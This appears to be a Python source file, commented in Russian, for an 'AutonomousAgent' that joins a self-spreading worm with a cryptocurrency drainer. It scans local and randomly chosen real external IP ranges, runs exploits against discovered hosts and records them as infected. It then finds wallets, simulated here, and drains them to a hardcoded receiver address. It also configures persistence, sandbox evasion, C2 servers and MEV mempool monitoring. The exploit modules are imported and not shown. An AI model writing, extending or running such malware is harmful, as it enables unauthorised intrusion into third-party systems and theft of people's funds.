#!/usr/bin/env python3
"""
AutonomousAgent - Продвинутый модуль, объединяющий функционал червя и криптодрейнера
для автоматического обнаружения, распространения и монетизации.
"""

import os
import sys
import time
import json
import random
import logging
import threading
import ipaddress
from typing import Dict, List, Any, Optional, Tuple, Set, Union

# Импортируем основные модули
from worm.worm_core import WormCore
from worm.propagation import PropagationEngine
from modules.web3_drainer import Web3Drainer, MEVDrainer
from vulnerability_scanner import VulnerabilityScanner
from exploit_engine import ExploitEngine
from exploit_manager import ExploitManager
from steganography import SteganoManager

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='autonomous_agent.log'
)
logger = logging.getLogger('AutonomousAgent')

class AutonomousAgent:
    """
    Автономный агент, интегрирующий функциональность червя и криптодрейнера
    для автоматического поиска, эксплуатации и монетизации уязвимостей
    """
    
    def __init__(self, config_file: Optional[str] = None):
        """
        Инициализация автономного агента
        
        Args:
            config_file: Путь к файлу конфигурации
        """
        self.logger = logger
        self.logger.info("Initializing AutonomousAgent")
        
        # Загружаем конфигурацию
        self.config = self._load_config(config_file)
        
        # Инициализируем основные компоненты
        self.worm_core = WormCore(self.config.get('worm', {}))
        self.propagation_engine = PropagationEngine()
        self.web3_drainer = Web3Drainer(log_level=self.config.get('log_level', 'INFO'))
        self.mev_drainer = MEVDrainer(log_level=self.config.get('log_level', 'INFO'))
        self.exploit_engine = ExploitEngine()
        self.vulnerability_scanner = VulnerabilityScanner()
        self.exploit_manager = ExploitManager()
        self.stegano_manager = SteganoManager()
        
        # Внутренние переменные
        self.running = False
        self.threads = []
        self.infected_hosts = set()
        self.victims_data = {}  # Данные о жертвах, включая криптокошельки
        self.mutex = threading.Lock()
        
        # Статистика
        self.stats = {
            "started_at": time.time(),
            "scanned_hosts": 0,
            "infected_hosts": 0,
            "detected_wallets": 0,
            "drained_wallets": 0,
            "total_drained_value": 0.0
        }
        
        self.logger.info("AutonomousAgent initialized successfully")
    
    def _load_config(self, config_file: Optional[str]) -> Dict[str, Any]:
        """
        Загружает конфигурацию из файла или использует конфигурацию по умолчанию
        
        Args:
            config_file: Путь к файлу конфигурации
            
        Returns:
            Dict: Загруженная конфигурация
        """
        default_config = {
            "log_level": "INFO",
            "c2_servers": ["localhost:8080"],
            "worm": {
                "sleep_interval": 120,
                "jitter": 30,
                "stealth_mode": True,
                "propagation_enabled": True,
                "max_targets_per_wave": 5
            },
            "crypto": {
                "receiver_addresses": {
                    "ethereum": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
                    "binance": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
                },
                "min_profit_threshold": 0.1  # В USD
            },
            "persistence": {
                "enabled": True,
                "methods": ["registry", "startup", "service", "cron"]
            },
            "stealth": {
                "detect_sandboxes": True,
                "detect_monitoring": True,
                "adaptive_behavior": True
            }
        }
        
        if not config_file or not os.path.exists(config_file):
            self.logger.warning(f"Config file not found, using default configuration")
            return default_config
        
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                # Объединяем с дефолтными настройками
                for section in default_config:
                    if section not in config:
                        config[section] = default_config[section]
                    elif isinstance(default_config[section], dict):
                        for key in default_config[section]:
                            if key not in config[section]:
                                config[section][key] = default_config[section][key]
            return config
        except Exception as e:
            self.logger.error(f"Error loading config: {e}")
            return default_config
    
    def start(self):
        """Запускает автономного агента"""
        if self.running:
            self.logger.warning("Agent is already running")
            return
        
        self.running = True
        self.logger.info("Starting AutonomousAgent")
        
        # Настраиваем криптодрейнер
        self._setup_crypto_drainer()
        
        # Запускаем основные потоки
        self._start_threads()
        
        # Запускаем базовую функциональность червя
        self.worm_core.start()
        
        self.logger.info("AutonomousAgent started successfully")
    
    def stop(self):
        """Останавливает автономного агента"""
        if not self.running:
            return
            
        self.running = False
        self.logger.info("Stopping AutonomousAgent")
        
        # Останавливаем червя
        self.worm_core.stop()
        
        # Останавливаем потоки
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=5)
        
        self.logger.info("AutonomousAgent stopped")
    
    def _setup_crypto_drainer(self):
        """Настраивает криптодрейнер"""
        # Устанавливаем адреса получателей
        crypto_config = self.config.get('crypto', {})
        receiver_addresses = crypto_config.get('receiver_addresses', {})
        
        for chain, address in receiver_addresses.items():
            self.web3_drainer.set_receiver_address(chain, address)
        
        # Настраиваем MEV-дрейнер
        self.mev_drainer.set_profit_threshold(
            crypto_config.get('min_profit_threshold', 0.1)
        )
    
    def _start_threads(self):
        """Запускает рабочие потоки"""
        # Поток для сканирования сетей
        network_scanner_thread = threading.Thread(
            target=self._network_scanner_loop,
            name="NetworkScanner"
        )
        network_scanner_thread.daemon = True
        self.threads.append(network_scanner_thread)
        network_scanner_thread.start()
        
        # Поток для поиска криптокошельков
        wallet_hunter_thread = threading.Thread(
            target=self._wallet_hunter_loop,
            name="WalletHunter"
        )
        wallet_hunter_thread.daemon = True
        self.threads.append(wallet_hunter_thread)
        wallet_hunter_thread.start()
        
        # Поток для дрейна обнаруженных кошельков
        crypto_drainer_thread = threading.Thread(
            target=self._crypto_drainer_loop,
            name="CryptoDrainer"
        )
        crypto_drainer_thread.daemon = True
        self.threads.append(crypto_drainer_thread)
        crypto_drainer_thread.start()
        
        # Поток для MEV-операций
        mev_thread = threading.Thread(
            target=self._mev_operations_loop,
            name="MEVOperations"
        )
        mev_thread.daemon = True
        self.threads.append(mev_thread)
        mev_thread.start()
    
    def _network_scanner_loop(self):
        """Основной цикл сканирования сетей"""
        self.logger.info("Starting network scanner loop")
        
        while self.running:
            try:
                # Автоопределение локальных сетей
                networks = self.propagation_engine.autodetect_networks()
                
                # Добавляем случайные внешние сети
                target_networks = networks.copy()
                if random.random() < 0.3:  # 30% шанс включить сканирование внешних сетей
                    external_networks = [
                        "45.33.0.0/16",
                        "104.131.0.0/16",
                        "143.198.0.0/16",
                        "138.68.0.0/16",
                        "209.97.0.0/16"
                    ]
                    target_networks.append(random.choice(external_networks))
                
                # Сканируем каждую сеть
                for network in target_networks:
                    if not self.running:
                        break
                    
                    # Быстрое сканирование живых хостов
                    hosts = self.propagation_engine.scan_network(network, quick=True)
                    
                    with self.mutex:
                        self.stats["scanned_hosts"] += len(hosts)
                    
                    # Для каждого хоста проверяем порты и уязвимости
                    for host in hosts:
                        if not self.running:
                            break
                            
                        # Избегаем повторного сканирования уже зараженных хостов
                        if host in self.infected_hosts:
                            continue
                        
                        # Сканируем порты
                        open_ports = self.propagation_engine.scan_ports(host)
                        
                        # Если есть открытые порты, ищем уязвимости
                        if open_ports:
                            vulnerabilities = self.propagation_engine.identify_vulnerabilities(host, open_ports)
                            
                            # Если нашли уязвимости, выбираем эксплойты
                            if vulnerabilities:
                                exploits = self.propagation_engine.select_exploits(host, vulnerabilities)
                                
                                # Выполняем эксплойты
                                results = self.propagation_engine.execute_exploits(exploits)
                                
                                # Обновляем статистику заражений
                                for exploit_host, success in results.items():
                                    if success:
                                        with self.mutex:
                                            self.infected_hosts.add(exploit_host)
                                            self.stats["infected_hosts"] += 1
                
                # Случайная задержка между циклами сканирования
                sleep_time = random.randint(60, 300)  # 1-5 минут
                self.logger.info(f"Network scan completed. Sleeping for {sleep_time} seconds")
                time.sleep(sleep_time)
                
            except Exception as e:
                self.logger.error(f"Error in network scanner: {e}")
                time.sleep(60)  # Задержка при ошибке
    
    def _wallet_hunter_loop(self):
        """Поиск криптокошельков на зараженных машинах"""
        self.logger.info("Starting wallet hunter loop")
        
        while self.running:
            try:
                # Обрабатываем только новые зараженные хосты
                with self.mutex:
                    hosts_to_process = self.infected_hosts.copy()
                
                for host in hosts_to_process:
                    if not self.running:
                        break
                        
                    # Пропускаем хосты, которые уже обработаны
                    if host in self.victims_data:
                        continue
                    
                    self.logger.info(f"Hunting for crypto wallets on {host}")
                    
                    # Здесь должна быть логика поиска криптокошельков
                    # В рамках PoC просто симулируем нахождение кошельков
                    wallets = self._simulate_wallet_search(host)
                    
                    if wallets:
                        with self.mutex:
                            self.victims_data[host] = wallets
                            self.stats["detected_wallets"] += len(wallets)
                            self.logger.info(f"Found {len(wallets)} wallets on {host}")
                
                # Задержка между циклами
                time.sleep(120)
                
            except Exception as e:
                self.logger.error(f"Error in wallet hunter: {e}")
                time.sleep(60)
    
    def _simulate_wallet_search(self, host: str) -> List[Dict[str, Any]]:
        """
        Симулирует поиск криптокошельков (для демонстрации)
        
        Args:
            host: IP-адрес хоста
            
        Returns:
            List[Dict]: Найденные кошельки
        """
        # В реальном коде здесь было бы фактическое сканирование системы
        wallets = []
        
        # Случайное количество кошельков (0-3)
        wallet_count = random.randint(0, 3)
        
        for _ in range(wallet_count):
            wallet_type = random.choice(["ethereum", "binance", "bitcoin"])
            
            # Генерируем фейковый приватный ключ
            private_key = ''.join(random.choice('0123456789abcdef') for _ in range(64))
            
            wallets.append({
                "type": wallet_type,
                "private_key": private_key,
                "drained": False
            })
        
        return wallets
    
    def _crypto_drainer_loop(self):
        """Дрейн криптовалюты с найденных кошельков"""
        self.logger.info("Starting crypto drainer loop")
        
        while self.running:
            try:
                with self.mutex:
                    hosts_with_wallets = [h for h in self.victims_data]
                
                for host in hosts_with_wallets:
                    if not self.running:
                        break
                    
                    with self.mutex:
                        wallets = self.victims_data[host]
                    
                    # Обрабатываем каждый кошелек
                    for wallet in wallets:
                        if wallet.get("drained", False):
                            continue
                        
                        self.logger.info(f"Attempting to drain {wallet['type']} wallet")
                        
                        # Пытаемся вывести средства
                        if wallet['type'] == "ethereum":
                            result = self.web3_drainer.drain_account(
                                "ethereum", "mainnet", wallet['private_key']
                            )
                        elif wallet['type'] == "binance":
                            result = self.web3_drainer.drain_account(
                                "binance", "mainnet", wallet['private_key']
                            )
                        else:
                            result = {"error": "Unsupported wallet type"}
                        
                        # Если нет ошибок, помечаем кошелек как drained
                        if "error" not in result:
                            wallet["drained"] = True
                            wallet["drain_result"] = result
                            
                            with self.mutex:
                                self.stats["drained_wallets"] += 1
                                
                                # Подсчитываем общую стоимость выведенных средств
                                if "native" in result and result["native"]:
                                    self.stats["total_drained_value"] += result["native"].get("value", 0)
                                
                                for token, token_info in result.get("tokens", {}).items():
                                    self.stats["total_drained_value"] += token_info.get("value", 0)
                            
                            self.logger.info(f"Successfully drained wallet")
                        else:
                            self.logger.warning(f"Failed to drain wallet: {result['error']}")
                
                # Задержка между циклами
                time.sleep(180)
                
            except Exception as e:
                self.logger.error(f"Error in crypto drainer: {e}")
                time.sleep(60)
    
    def _mev_operations_loop(self):
        """MEV-операции на Ethereum и других блокчейнах"""
        self.logger.info("Starting MEV operations loop")
        
        # Добавляем случайные приватные ключи для MEV-операций
        for _ in range(3):
            # Генерируем фейковый приватный ключ
            private_key = ''.join(random.choice('0123456789abcdef') for _ in range(64))
            self.mev_drainer.add_private_key(private_key)
        
        # Случайно выбираем сеть для мониторинга
        chain = random.choice(["ethereum", "binance", "polygon"])
        network = "mainnet"
        
        try:
            # Запускаем мониторинг мемпула
            self.mev_drainer.monitor_mempool(chain, network)
        except Exception as e:
            self.logger.error(f"Error in MEV operations: {e}")
    
    def get_stats(self) -> Dict[str, Any]:
        """
        Возвращает текущую статистику работы агента
        
        Returns:
            Dict: Статистика работы
        """
        with self.mutex:
            stats = self.stats.copy()
            stats["runtime"] = time.time() - stats["started_at"]
            stats["runtime_readable"] = self._format_time(stats["runtime"])
        
        return stats
    
    def _format_time(self, seconds: float) -> str:
        """
        Форматирует время в человекочитаемый вид
        
        Args:
            seconds: Время в секундах
            
        Returns:
            str: Отформатированное время
        """
        minutes, seconds = divmod(int(seconds), 60)
        hours, minutes = divmod(minutes, 60)
        days, hours = divmod(hours, 24)
        
        parts = []
        if days > 0:
            parts.append(f"{days}d")
        if hours > 0:
            parts.append(f"{hours}h")
        if minutes > 0:
            parts.append(f"{minutes}m")
        parts.append(f"{seconds}s")
        
        return " ".join(parts)


if __name__ == "__main__":
    # Проверяем наличие аргумента с путем к конфигурации
    config_path = sys.argv[1] if len(sys.argv) > 1 else None
    
    # Создаем и запускаем автономного агента
    agent = AutonomousAgent(config_path)
    agent.start()
    
    try:
        # Основной цикл с выводом статистики
        while True:
            time.sleep(60)
            stats = agent.get_stats()
            print(f"Runtime: {stats['runtime_readable']}, "
                  f"Scanned: {stats['scanned_hosts']}, "
                  f"Infected: {stats['infected_hosts']}, "
                  f"Wallets: {stats['detected_wallets']}, "
                  f"Drained: {stats['drained_wallets']}, "
                  f"Value: ${stats['total_drained_value']:.2f}")
    except KeyboardInterrupt:
        print("Stopping agent...")
        agent.stop() 